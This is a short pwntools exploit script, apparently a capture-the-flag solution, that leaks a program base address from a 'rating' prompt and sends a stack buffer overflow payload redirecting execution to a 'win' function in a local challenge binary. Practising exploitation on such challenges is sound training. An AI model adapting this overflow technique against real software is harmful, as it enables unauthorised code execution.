from pwn import *
context.binary = exe = ELF('./chall')
context.terminal = ['tmux', 'splitw', '-h']

gdbscript = """
c
"""

#io = gdb.debug(exe.path, gdbscript)
io = remote('localhost', 50000)

io.sendline(b'')

io.readuntil(b'rating: ')

base = int(io.readline().strip()) - 0x1287

log.info(f'base: {hex(base)}')

payload = b'A'*0x78
payload += p64(base + 0x123e) # win

io.sendline(payload)

io.interactive()
